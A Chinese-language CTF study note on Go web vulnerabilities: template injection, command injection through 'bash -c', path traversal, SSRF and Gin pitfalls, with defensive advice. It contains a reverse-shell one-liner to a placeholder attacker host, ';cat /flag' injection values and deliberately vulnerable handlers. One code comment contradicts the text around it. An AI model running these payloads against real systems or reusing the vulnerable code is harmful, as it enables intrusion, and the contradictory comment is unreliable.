# Go 安全

## 概述

Go 语言在 CTF 中出现的频率低于 PHP 和 Python，但随着 Go 在 Web 开发中的普及，相关题目也越来越多。Go 的模板注入（html/template、text/template）和命令执行是最常见的考点。Go 的强类型特性和严格的编译检查使得漏洞模式相对固定。

## 常见攻击手法

### 1. 模板注入 (SSTI)

Go 标准库提供的 `text/template` 和 `html/template` 包在某些配置下存在模板注入风险。

- **text/template**：
  - 比 html/template 更容易出现 SSTI，因为它不自动转义 HTML
  - 检测 Payload：`{{.}}` 输出当前上下文对象
  - `{{printf "%s" .}}` 格式化输出
  - 访问嵌套字段：`{{.Field.SubField}}`

- **方法调用**：
  - Go 模板可以调用导出方法（首字母大写）
  - `{{.Method}}` 调用不带参数的方法
  - `{{.Method "arg"}}` 调用带参数的方法

- **自定义函数利用**：
  - 模板注册了危险的自定义函数时可直接利用
  - `{{evilFunc "arg"}}`

- **text/template vs html/template**：
  - `html/template` 自动转义 HTML 特殊字符，但仅对 HTML 上下文中有效
  - `text/template` 不做任何转义，在非 HTML 场景（如生成代码、配置文件）同样危险

- **命令执行路径**：
  - Go 的模板引擎本身不提供直接执行命令的内置函数
  - 需要利用模板中可访问的变量和方法，间接调用系统命令
  - 常见场景：模板上下文传递了具有危险方法的结构体

- **Payload 示例**：
  ```
  {{.}}
  {{.Field}}
  {{printf "arg"}}
  {{range .Items}}{{.}}{{end}}
  ```

### 2. 命令执行

- **os/exec 包**：
  - `exec.Command("ls", "-la").Output()` 执行命令并获取输出
  - `exec.Command("bash", "-c", "cat /flag").Run()` 执行命令
  - `exec.CommandContext()` 带超时的命令执行

- **命令注入场景**：
  ```go
  cmd := exec.Command("ping", "-c", "1", userInput)
  // 如果 userInput 包含 "127.0.0.1; cat /flag"，仅在 Linux 下有效
  ```
  - Go 的 `exec.Command` 不自动解析 shell 语法（不调用 shell），因此 `;`、`|` 等操作符不会生效
  - 如果需要 shell 解析，必须使用 `bash -c` 或 `cmd /c`

- **真正的命令注入**：
  - 当开发者使用 `bash -c` 包装时：
    ```go
    cmd := exec.Command("bash", "-c", "ping -c 1 " + userInput)
    // 此时用户输入中的 ; cat /flag 会在 shell 中解释执行
    ```

- **反弹 Shell**：
  - `exec.Command("bash", "-c", "bash -i >& /dev/tcp/attacker/4444 0>&1").Run()`

### 3. 路径遍历与文件读取

- **http.Dir 和 FileServer**：
  ```go
  http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
  ```
  - Go 的 `http.Dir` 默认对路径遍历有防护（会清理 `..`），但在某些版本或自定义文件服务器中有绕过可能

- **不安全的文件读取**：
  ```go
  func handler(w http.ResponseWriter, r *http.Request) {
      path := r.URL.Query().Get("file")
      data, _ := ioutil.ReadFile(path)  // 路径遍历
      w.Write(data)
  }
  ```

### 4. 其他特性

- **Go 的 JSON 解析**：`json.Unmarshal` 本身不会导致 RCE，但结合 `interface{}` 和类型断言时可能出现意外行为
- **SQL 注入**：Go 中使用 `database/sql` 时若拼接 SQL 字符串而非使用参数化查询，同样存在注入风险
- **SSRF**：`http.Get(userInput)` 可被用于 SSRF
- **ReDoS**：Go 的正则表达式引擎使用 RE2，不支持回溯，因此不易受 ReDoS 攻击

### 5. Gin 框架安全隐患

- **绑定验证**：`c.ShouldBindJSON(&obj)` 若结构体字段 tag 不当可导致意外绑定
- **路由参数**：Gin 的 `:param` 和 `*param` 路由可能被利用进行路径遍历
- **中间件绕过**：路由顺序不当可能绕过认证中间件

## 相关工具

| 工具 | 用途 |
|------|------|
| curl / Burp | 手工测试模板注入 |
| Go playground | Go 代码行为测试 |
| ffuf | 参数枚举 |

## 防御建议

- 不要对用户输入使用 `text/template`，优先使用 `html/template`
- 避免在模板中暴露危险的方法或变量
- 使用参数化查询而非字符串拼接
- Go 执行系统命令时避免使用 `bash -c`

## CTF 中的常见考点

- `text/template` 注入读取服务器信息
- 利用模板中可访问的对象方法实现命令执行
- 路径遍历读取 `/flag` 文件
- 通过 `bash -c` 参数拼接实现命令注入

## 相关技能

- [Python](Python.md)
- [PHP](PHP.md)
- [Golang程序逆向](../逆向工程/Golang程序逆向.md)
